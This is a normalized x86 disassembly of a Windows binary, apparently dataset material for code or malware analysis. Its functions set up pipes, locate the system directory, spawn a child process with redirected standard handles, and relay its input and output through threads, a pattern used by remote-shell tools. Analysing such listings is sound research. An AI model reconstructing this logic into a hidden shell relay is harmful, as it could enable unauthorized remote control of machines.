mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] 0x0
call eax
mov edx [ edi + 0x8 ]
lea ecx [ edi + 0x8 ]
push eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] 0x0
call eax
mov esi [ ebp - 0x10 ]
jmp r-xdata
call sub_412490
push 0x1c
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
sub_411380
push ebp
mov ebp esp
sub esp 0xc
cmp [ ecx + 0x40 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x40 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
push eax
call edx
mov esp ebp
pop ebp
retn 0x4
push 0x7
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0xc ]
push ecx
call sub_41ac98
sub_4113d0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
test edi edi
jne r-xdata
mov edx [ ecx + 0x10 ]
push ebx
push esi
cmp eax edx
jae r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
pop esi
or eax 0xffffffff
pop ebx
sub edx eax
mov ebx edx
cmp edi ebx
ja r-xdata
pop edi
mov esp ebp
pop ebp
retn 0xc
mov edx 0x1
sub edx edi
add ebx edx
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
movzx esi [ ecx ]
lea eax [ edx + eax * 2 ]
test eax eax
je r-xdata
add eax 0x2
dec edx
jne r-xdata
mov esi ecx
mov edx eax
test edi edi
je r-xdata
cmp [ eax ] si
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov cx [ edx ]
cmp cx [ esi ]
jne r-xdata
pop esi
sub eax ecx
pop ebx
sar eax 0x1
pop edi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sbb ecx ecx
and ecx 0xfffffffe
inc ecx
je r-xdata
add edx 0x2
add esi 0x2
dec edi
jne r-xdata
mov edi [ ebp + 0x10 ]
mov edx eax
sub edx [ ebp + 0xc ]
or ecx 0xffffffff
sar edx 0x1
sub ecx edx
add ebx ecx
add eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] eax
mov edx ebx
test ebx ebx
je r-xdata
sub_411490
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call [ GetExitCodeProcess@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x1c ]
push edx
push eax
call [ TerminateProcess@IAT ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor edx edx
mov [ esi ] dx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
push ecx
call sub_41a0d6
add esp 0x4
sub_4114f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e360
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov ecx [ edi + 0x40 ]
mov edx [ ecx ]
mov eax [ edx ]
call eax
mov esi eax
cmp esi ebx
je r-xdata
push 0x6
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp + 0x8 ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_41ac98
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ esi + 0x10 ]
cmp edx ebx
jbe r-xdata
cmp [ edi + 0x40 ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push eax
call [ ExitThread@IAT ]
mov eax [ edi + 0x20 ]
push ebx
lea ebx [ ebp - 0x14 ]
push ebx
push edx
push ecx
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_41a0d6
add esp 0x4
mov ecx [ esi ]
push ecx
call sub_41a0d6
add esp 0x4
sub_4115e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_419533
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push r--data
call sub_4194e6
cmp edx 0x8
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea edi [ eax + ecx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_401520
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0x10 ]
sub eax ecx
push edx
sar eax 0x1
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov ecx esi
call sub_407400
pop edi
pop esi
pop ebp
retn 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0xc
mov eax [ esi ]
pop ebx
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
mov edx [ ebp + 0x10 ]
lea ecx [ ecx + ebx * 2 ]
push ecx
lea ecx [ ebx + edx ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_401050
add esp 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ecx + ecx ]
mov ecx [ ebp + 0xc ]
push edx
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_41a0f0
add esp 0xc
push edi
mov ecx esi
call sub_401260
sub_411730
push ebp
mov ebp esp
push 0xffffffff
push sub_42e3a7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push 0x44
mov edi ecx
xor ebx ebx
lea ecx [ ebp - 0x2ac ]
push ebx
push ecx
mov [ ebp - 0x254 ] eax
call sub_41adb0
mov ecx [ ebp - 0x254 ]
add esp 0xc
push ebx
xor edx edx
push 0x1
xor eax eax
mov [ ebp - 0x27c ] edx
push 0x2
lea edx [ ebp - 0x26c ]
push edx
mov [ ebp - 0x268 ] eax
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x2ac ] 0x44
mov [ ebp - 0x2a8 ] ebx
mov [ ebp - 0x2a0 ] ebx
mov [ ebp - 0x2a4 ] ebx
mov [ ebp - 0x290 ] ebx
mov [ ebp - 0x294 ] ebx
mov [ ebp - 0x298 ] ebx
mov [ ebp - 0x29c ] ebx
mov [ ebp - 0x278 ] ebx
mov [ ebp - 0x280 ] 0x101
mov [ ebp - 0x274 ] ecx
mov [ ebp - 0x270 ] esi
call [ GetCurrentProcess@IAT ]
push eax
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ DuplicateHandle@IAT ]
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
push 0x207
lea ecx [ ebp - 0x217 ]
push ebx
push ecx
mov [ ebp - 0x218 ] bl
call sub_41adb0
push 0x18
call sub_41ac18
add esp 0x10
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x268 ]
mov ecx [ edi + 0x40 ]
mov [ ecx + 0x8 ] eax
mov edx [ edi + 0x40 ]
mov esi eax
mov [ edx + 0x4 ] 0x1
mov eax [ ebp - 0x264 ]
push eax
call [ CloseHandle@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x268 ]
push ecx
lea edx [ ebp - 0x2ac ]
push edx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
push ebx
push eax
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x258 ] ebx
push 0xb
push rw-data
push 0x2c
push rw-data
mov ecx eax
call sub_412430
mov [ ebp - 0x258 ] eax
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
cmp eax 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov edx [ edi + 0x10 ]
lea ecx [ ecx + edx * 2 ]
cmp eax 0x8
jb r-xdata
mov [ ebp - 0x254 ] edx
cmp [ eax + 0x14 ] ecx
jb r-xdata
lea edx [ ebp - 0x234 ]
mov edx [ ebp - 0x254 ]
push edx
push ecx
push eax
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0xf
mov [ ebp - 0x224 ] ebx
mov [ ebp - 0x234 ] bl
call sub_40c5c0
mov ecx [ ebp - 0x258 ]
lea eax [ ebp - 0x250 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_412890
mov edx [ ebp - 0x234 ]
mov ecx 0x10
cmp [ ebp - 0x220 ] ecx
jae r-xdata
mov esi eax
mov esi [ eax ]
jmp r-xdata
mov [ ebp - 0x23c ] 0xf
mov [ ebp - 0x240 ] ebx
mov [ ebp - 0x250 ] bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x220 ] esi
jb r-xdata
mov edx [ ebp - 0x250 ]
push edx
call sub_41a0d6
add esp 0x4
call [ GetLastError@IAT ]
push eax
mov eax [ ebp - 0x254 ]
push eax
lea ecx [ ebp - 0x218 ]
push esi
push ecx
call sub_41b039
mov esi 0x10
add esp 0x10
cmp [ ebp - 0x23c ] esi
jb r-xdata
mov esi [ ebp - 0x258 ]
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x234 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x1c
call sub_41ac18
mov esi eax
add esp 0x4
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
xor esi esi
lea eax [ ebp - 0x218 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
mov ecx [ edi + 0x40 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
push 0x3
lea ecx [ ebp - 0x258 ]
push ecx
lea ecx [ ebp - 0x2c4 ]
mov [ ebp - 0x258 ] r--data
call sub_419f0f
push r--data
lea edx [ ebp - 0x2c4 ]
push edx
call sub_41ac98
int3
push 0x7
lea edx [ ebp - 0x254 ]
push edx
lea ecx [ ebp - 0x2b8 ]
mov [ ebp - 0x254 ] r--data
call sub_419f0f
push r--data
lea eax [ ebp - 0x2b8 ]
push eax
call sub_41ac98
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x218 ]
push ecx
mov ecx esi
call sub_4076d0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ edi + 0x40 ] ebx
jne r-xdata
sub_411ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e3e3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov eax [ eax + 0x2c ]
push ebx
lea ecx [ ebp - 0x3c ]
push ecx
push ebx
push ebx
push ebx
push eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] bl
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x6d
je r-xdata
mov edi [ ebp - 0x3c ]
cmp edi ebx
jbe r-xdata
push ebx
call [ ExitThread@IAT ]
int3
push 0x8
lea edx [ ebp - 0x30 ]
push edx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x30 ] r--data
call sub_419f0f
push r--data
lea eax [ ebp - 0x4c ]
push eax
call sub_41ac98
push 0x32
call [ Sleep@IAT ]
lea edx [ edi + 0x4 ]
push 0x1
push edx
call sub_41acef
mov esi eax
add esp 0x8
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x38 ]
push ebx
lea ecx [ ebp - 0x3c ]
push ecx
push ebx
push ebx
push ebx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x38 ]
push ebx
lea eax [ ebp - 0x40 ]
push eax
push edi
push esi
push ecx
call [ ReadFile@IAT ]
xor edi edi
cmp [ ebp - 0x40 ] ebx
jbe r-xdata
push esi
call sub_41a7eb
push 0x1c
call sub_41ac18
mov esi eax
add esp 0x8
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
mov edi edi
xor esi esi
push 0xffffffff
push ebx
lea eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_4075e0
jmp r-xdata
mov al [ edi + esi ]
lea ecx [ ebp - 0x2c ]
cmp al 0x3c
jne r-xdata
cmp [ ebp - 0x34 ] 0xd
je r-xdata
push 0x7
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x30 ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0x4c ]
push ecx
call sub_41ac98
mov ecx [ eax + 0x40 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] ebx
jae r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] bl
cmp [ eax + 0x40 ] ebx
je r-xdata
cmp al 0x3e
jne r-xdata
push 0x3
push r--data
call sub_40b9c0
jmp r-xdata
push 0xd
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40bae0
mov [ eax ] bl
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] al
mov edx [ ebp - 0x34 ]
push edx
push 0x1
call sub_40bae0
push 0x3
push r--data
call sub_40b9c0
jmp r-xdata
inc edi
cmp edi [ ebp - 0x40 ]
jb r-xdata
cmp [ edi + esi ] 0xa
jne r-xdata
sub_411ca0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x10 ]
sub eax esi
sar eax 0x1
push eax
push edx
push 0x0
call sub_4115e0
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_403a40
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_411d00
push ebp
mov ebp esp
push 0xffffffff
push sub_42e460
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4a8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4b4 ] esi
mov [ esi ] ax
push 0x18
mov [ ebp - 0x4 ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x4b0 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_412420
mov edi eax
jmp r-xdata
push 0x206
lea ecx [ ebp - 0x216 ]
xor eax eax
push ebx
push ecx
mov [ ebp - 0x218 ] ax
call sub_41adb0
mov eax [ ebp - 0x43c ]
mov edi 0x8
add esp 0xc
cmp [ ebp - 0x428 ] edi
jae r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
push 0xb
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] bl
call sub_4124b0
push 0x10
push rw-data
mov ecx edi
call sub_412490
lea ecx [ ebp - 0x458 ]
push ecx
mov ecx edi
call sub_412790
push 0x10
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_412490
lea edx [ ebp - 0x43c ]
push edx
mov ecx edi
call sub_412790
mov [ ebp - 0x4 ] 0x3
cmp edi ebx
je r-xdata
push 0x104
lea edx [ ebp - 0x218 ]
push edx
push eax
call [ GetEnvironmentVariableW@IAT ]
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x43c ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x218 ]
push eax
mov ecx esi
call sub_403650
mov edx [ ebp - 0x458 ]
cmp [ ebp - 0x444 ] edi
jae r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
mov edi edi
lea edx [ ebp - 0x458 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push ebx
push edx
mov ecx esi
call sub_4113d0
cmp eax 0xffffffff
jne r-xdata
mov edi 0x8
push 0x206
lea edx [ ebp - 0x41e ]
xor ecx ecx
push ebx
push edx
mov [ ebp - 0x420 ] cx
call sub_41adb0
add esp 0xc
push 0x104
lea eax [ ebp - 0x420 ]
push eax
call [ GetSystemDirectoryW@IAT ]
xor ecx ecx
push 0x1
mov [ ebp - 0x474 ] cx
push r--data
lea ecx [ ebp - 0x474 ]
mov [ ebp - 0x460 ] 0x7
mov [ ebp - 0x464 ] ebx
call sub_403650
lea edx [ ebp - 0x474 ]
push edx
lea eax [ ebp - 0x420 ]
push eax
lea ecx [ ebp - 0x490 ]
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_411ca0
lea edx [ ebp - 0x458 ]
push edx
push eax
lea eax [ ebp - 0x4ac ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_407e00
add esp 0x18
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x6
call sub_403a40
mov edi 0x8
cmp [ ebp - 0x498 ] edi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x428 ] 0x7
mov [ ebp - 0x42c ] ebx
mov [ ebp - 0x43c ] cx
cmp [ ebp - 0x444 ] edi
jb r-xdata
mov eax [ ebp - 0x43c ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x498 ] 0x7
mov [ ebp - 0x49c ] ebx
mov [ ebp - 0x4ac ] dx
cmp [ ebp - 0x47c ] edi
jb r-xdata
mov ecx [ ebp - 0x4ac ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x458 ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x47c ] 0x7
mov [ ebp - 0x480 ] ebx
mov [ ebp - 0x490 ] cx
cmp [ ebp - 0x460 ] edi
jb r-xdata
mov eax [ ebp - 0x490 ]
push eax
call sub_41a0d6
add esp 0x4
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x40 ] ebx
cmp [ ebp - 0x428 ] edi
jb r-xdata
mov edx [ ebp - 0x474 ]
push edx
call sub_41a0d6
add esp 0x4
jmp r-xdata
sub_412030
push ebp
mov ebp esp
push 0xffffffff
push sub_42e4d2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor eax eax
push 0x0
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
push ecx
lea eax [ esi + 0x20 ]
push eax
lea ebx [ esi + 0x24 ]
push ebx
mov [ ebp - 0x24 ] 0xc
mov [ ebp - 0x1c ] 0x1
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x24 ]
push ecx
lea edi [ esi + 0x28 ]
lea eax [ esi + 0x2c ]
push edi
push eax
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x1
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x14 ] r--data
call sub_419f0f
push r--data
lea eax [ ebp - 0x3c ]
push eax
call sub_41ac98
mov ecx [ edi ]
mov edx [ ebx ]
push ecx
push edx
mov ecx esi
call sub_411730
mov edi [ CreateThread@IAT ]
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x30 ]
push eax
push 0x0
push esi
push sub_4114f0
push 0x0
lea ecx [ ebp - 0x24 ]
push ecx
call edi
mov [ esi + 0x34 ] eax
test eax eax
jne r-xdata
push 0x2
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x14 ] r--data
call sub_419f0f
push r--data
lea eax [ ebp - 0x3c ]
push eax
call sub_41ac98
lea ecx [ esi + 0x3c ]
push ecx
push 0x0
push esi
push sub_411ac0
push 0x0
lea edx [ ebp - 0x24 ]
push edx
call edi
mov [ esi + 0x38 ] eax
test eax eax
jne r-xdata
push 0x4
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x14 ] r--data
call sub_419f0f
push r--data
lea eax [ ebp - 0x3c ]
push eax
call sub_41ac98
mov edx [ esi + 0x34 ]
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x1c ]
push ecx
push 0x3
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x28 ] eax
call [ WaitForMultipleObjects@IAT ]
mov ecx [ esi + 0x40 ]
xor edi edi
sub eax edi
mov ebx 0x1
mov [ ecx + 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
je r-xdata
push 0x5
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x18 ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0x48 ]
push ecx
call sub_41ac98
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
sub eax ebx
je r-xdata
push 0x1c
mov [ ebp - 0x4 ] 0xffffffff
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
push 0xb
push rw-data
push 0x31
push rw-data
mov ecx eax
call sub_412430
mov edi eax
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
sub eax ebx
jne r-xdata
xor eax eax
push eax
mov ecx edi
call sub_412890
jmp r-xdata
or ebx 0xffffffff
push 0x1c
mov [ ebp - 0x4 ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push 0xb
push rw-data
push 0x31
push rw-data
mov ecx eax
call sub_412430
mov edi eax
mov edx [ esi + 0x20 ]
mov ebx [ DisconnectNamedPipe@IAT ]
push edx
call ebx
mov eax [ esi + 0x20 ]
mov edi [ CloseHandle@IAT ]
push eax
call edi
mov ecx [ esi + 0x2c ]
push ecx
call ebx
mov edx [ esi + 0x2c ]
push edx
call edi
mov eax [ esi + 0x34 ]
push eax
call edi
mov ecx [ esi + 0x38 ]
push ecx
call edi
mov edx [ esi + 0x1c ]
push edx
call edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax edi
je r-xdata
mov ecx [ esi + 0x38 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
call [ GetExitCodeThread@IAT ]
mov edx [ ebp - 0x10 ]
mov eax [ esi + 0x38 ]
push edx
push eax
call [ TerminateThread@IAT ]
mov edx [ esi + 0x1c ]
lea ecx [ ebp - 0x10 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x1c ]
push eax
push ecx
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_411380
test edi edi
je r-xdata
xor eax eax
push eax
mov ecx edi
call sub_412890
jmp r-xdata
or ebx 0xffffffff
push 0x1c
mov [ ebp - 0x4 ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
push 0xb
push rw-data
push 0x19
push rw-data
mov ecx eax
call sub_412430
mov edi eax
mov edx [ esi + 0x34 ]
lea ecx [ ebp - 0x10 ]
push ecx
push edx
call [ GetExitCodeThread@IAT ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x34 ]
push eax
push ecx
call [ TerminateThread@IAT ]
mov eax [ esi + 0x1c ]
lea edx [ ebp - 0x10 ]
push edx
push eax
call [ GetExitCodeProcess@IAT ]
mov ecx [ ebp - 0x10 ]
mov edx [ esi + 0x1c ]
push ecx
push edx
jmp r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_411380
test edi edi
je r-xdata
xor eax eax
push eax
mov ecx edi
call sub_412890
jmp r-xdata
call [ TerminateProcess@IAT ]
mov eax [ esi + 0x38 ]
mov edi [ GetExitCodeThread@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
call edi
mov ecx [ ebp - 0x10 ]
mov edx [ esi + 0x38 ]
mov ebx [ TerminateThread@IAT ]
push ecx
push edx
call ebx
mov ecx [ esi + 0x34 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
call edi
mov edx [ ebp - 0x10 ]
mov eax [ esi + 0x34 ]
push edx
push eax
call ebx
jmp r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_411380
test edi edi
je r-xdata
sub_412430
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov eax ecx
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x10
sub_412460
push esi
